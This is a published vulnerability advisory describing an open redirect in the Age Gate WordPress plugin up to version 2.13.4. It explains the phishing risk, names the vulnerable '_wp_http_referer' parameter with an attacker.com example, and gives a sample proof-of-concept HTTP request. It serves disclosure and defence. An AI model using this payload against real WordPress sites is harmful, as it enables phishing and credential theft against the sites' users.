# Exploit Title: URL Redirection to Untrusted Site ('Open Redirect') Age
Gate Wordpress Plugin <= 2.13.4
# Date: 11/27/2020
# Exploit Author: Ilca Lucian Florin
# Vendor Homepage: https://agegate.io/
# Software Link: https://wordpress.org/plugins/age-gate/
# Version: <= 2.13.4
# Tested on: Latest Version of Desktop Web Browsers: Chrome, Firefox,
Microsoft Edge
# CVE: Waiting...

A web application accepts a user-controlled input that specifies a link to
an external site, and uses that link in a Redirect. This simplifies
phishing attacks. An http parameter may contain a URL value and could cause
the web application to redirect the request to the specified URL. By
modifying the URL value to a malicious site, an attacker may successfully
launch a phishing scam and steal user credentials. Because the server name
in the modified link is identical to the original site, phishing attempts
have a more trustworthy appearance. The impacts can be many, and vary from
the theft of information and credentials to the redirection to malicious
websites containing attacker-controlled content, which in some cases even
cause XSS attacks. So even though an open redirection might sound harmless
at first, the impacts of it can be severe should it be exploitable.

An Open Redirection is when a web application or server uses an unvalidated
user-submitted link to redirect the user to a given website or page. Even
though it seems like a harmless action to let a user decide to which page
he wants to be redirected, such technique if exploited can have a serious
impact on the application security, especially when combined with other
vulnerabilities and tricks.

Vulnerable parameter is: _wp_http_referer=http://attacker.com

# Example of burp request #

POST /wp-admin/admin-post.php HTTP/1.1
Host: website.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101
Firefox/78.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Origin: https://website.com
Connection: close
Referer: https://website.com/
Cookie: wordpress_sec_5fabc=editor%7C1606490639%b%abc;
__cfduid=def4624292458dcfae5008c89bb76b3ed1606317827; ftc_post_view_4716=1;
wordpress_test_cookie=WP%20Cookie%20check;
wordpress_logged_in_123=editor%%%abc;
wp-wpml_current_admin_language_d41d8cd98f00b204e9800998ecf8427e=mk;
wfwaf-authcookie-abc=12%7Ceditor%abc; tk_ai=woo%;
wp-settings-time-12=1606317841; wp-wpml_current_language=en;
ftc_post_view_934=1; _ga=GA1.2.; _gid=GA1.2.; _gat=1
Upgrade-Insecure-Requests: 1

age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&_wp_http_referer=
https://google.ro

Demo:

1. https://ibb.co/1K9MhhY
2. https://ibb.co/xSYQjZm
3. https://ibb.co/TMbS9yL

C.V.S.S Score: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L / 7.1 (High)

There are over 20.000 wordpress websites using this plugin at this moment.
